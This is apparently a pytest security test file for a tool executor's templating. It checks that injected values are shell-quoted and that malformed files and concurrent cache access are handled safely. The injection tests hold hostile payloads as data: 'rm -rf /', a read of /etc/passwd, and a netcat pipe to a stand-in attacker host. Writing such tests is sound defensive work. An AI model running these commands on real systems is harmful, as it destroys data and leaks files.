"""Security tests for injection attack prevention.

Tests cover:
- Command injection attempts
- Template injection attempts
- Malformed file handling
"""

import pytest
import sys
from pathlib import Path

# Add rye to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "rye"))

from rye.executor.primitive_executor import PrimitiveExecutor


class TestCommandInjection:
    """Test command injection prevention."""

    def test_command_injection_with_subshell(self):
        """Verify $(rm -rf /) is shell-quoted via shlex.quote."""
        executor = PrimitiveExecutor()
        
        config = {"cmd": "echo ${DANGER}"}
        env = {"DANGER": "$(rm -rf /)"}
        result = executor._template_config(config, env)
        
        # shlex.quote wraps dangerous values in single quotes, neutralizing subshells
        assert "'$(rm -rf /)'" in result["cmd"]

    def test_command_injection_with_backticks(self):
        """Verify `whoami` injection is escaped."""
        executor = PrimitiveExecutor()
        
        config = {"cmd": "echo ${USER}"}
        env = {"USER": "`whoami`"}
        result = executor._template_config(config, env)
        
        # Should be escaped
        assert "'" in str(result) or '\\' in str(result)

    def test_command_injection_with_semicolon(self):
        """Verify ; command separator is escaped."""
        executor = PrimitiveExecutor()
        
        config = {"cmd": "echo ${CMD}"}
        env = {"CMD": "cat /etc/passwd; echo hacked"}
        result = executor._template_config(config, env)
        
        # Should be escaped
        assert "'" in str(result) or '\\' in str(result)

    def test_command_injection_with_pipe(self):
        """Verify | pipe is escaped."""
        executor = PrimitiveExecutor()
        
        config = {"cmd": "echo ${DATA}"}
        env = {"DATA": "hello | nc attacker.com 1234"}
        result = executor._template_config(config, env)
        
        # Should be escaped
        assert "'" in str(result) or '\\' in str(result)

    def test_safe_values_not_over_quoted(self):
        """Verify normal values aren't unnecessarily escaped."""
        executor = PrimitiveExecutor()
        
        config = {"cmd": "echo ${USER}"}
        env = {"USER": "alice"}
        result = executor._template_config(config, env)
        
        # Should NOT be quoted since it's safe
        assert result["cmd"] == "echo alice"

    def test_mixed_safe_and_unsafe(self):
        """Verify mixed config is handled correctly."""
        executor = PrimitiveExecutor()
        
        config = {
            "safe": "${USER}",
            "dangerous": "${CMD}"
        }
        env = {
            "USER": "alice",
            "CMD": "$(whoami)"
        }
        result = executor._template_config(config, env)
        
        assert result["safe"] == "alice"
        assert "'" in str(result["dangerous"]) or '\\' in str(result["dangerous"])


class TestMalformedFiles:
    """Test handling of malformed files."""

    def test_malformed_python_parsing(self):
        """Verify malformed Python doesn't crash system."""
        import tempfile
        from rye.utils.validators import _extract_schema_from_file
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            # Syntax error in Python
            f.write('print(\nVALIDATION_SCHEMA = {"fields": {}}')
            f.flush()
            
            try:
                # Should use regex fallback, not crash
                result = _extract_schema_from_file(Path(f.name))
                # Should return either schema or None, never crash
                assert result is None or isinstance(result, dict)
            finally:
                Path(f.name).unlink()

    def test_incomplete_file_parsing(self):
        """Verify incomplete files are handled."""
        import tempfile
        from rye.utils.validators import _extract_schema_from_file
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            # Incomplete file
            f.write('VALIDATION_SCHEMA = {')
            f.flush()
            
            try:
                result = _extract_schema_from_file(Path(f.name))
                # Should return None, not crash
                assert result is None
            finally:
                Path(f.name).unlink()

    def test_unicode_in_file(self):
        """Verify Unicode content is handled."""
        import tempfile
        from rye.utils.validators import _extract_schema_from_file
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
            f.write('# 你好世界\nVALIDATION_SCHEMA = {"fields": {"name": {"type": "string"}}}')
            f.flush()
            
            try:
                result = _extract_schema_from_file(Path(f.name))
                # Should parse successfully
                assert result is not None
                assert "fields" in result
            finally:
                Path(f.name).unlink()


class TestCacheThreadSafety:
    """Test thread-safe cache access."""

    @pytest.mark.asyncio
    async def test_concurrent_cache_access(self):
        """Test cache with concurrent requests."""
        import threading
        from rye.utils.validators import get_validation_schema, clear_validation_schemas_cache
        
        clear_validation_schemas_cache()
        results = []
        errors = []

        def access_cache():
            try:
                schema = get_validation_schema('tool')
                results.append(schema)
            except Exception as e:
                errors.append(str(e))

        # Create 20 threads accessing cache simultaneously
        threads = [threading.Thread(target=access_cache) for _ in range(20)]
        
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # Should have no errors
        assert len(errors) == 0, f"Errors in concurrent access: {errors}"
        # All threads should get a result (None or schema)
        assert len(results) == 20


class TestErrorHandling:
    """Test error handling for security."""

    def test_validation_error_format(self):
        """Verify validation errors use standard format."""
        from rye.utils.errors import ErrorResponse, ErrorCode
        
        err = ErrorResponse.validation_failed(
            ["Field X required"],
            "test_tool"
        )
        result = err.to_dict()
        
        assert result["success"] is False
        assert result["error"]["code"] == "VALIDATION_FAILED"
        assert "issues" in result["error"]["details"]

    def test_circular_dependency_error(self):
        """Verify circular dependency errors are helpful."""
        from rye.utils.errors import ErrorResponse
        
        err = ErrorResponse.circular_dependency(["tool1", "tool2"])
        result = err.to_dict()
        
        assert result["success"] is False
        assert "CIRCULAR_DEPENDENCY" in result["error"]["code"]
        assert result["error"]["suggestion"] is not None
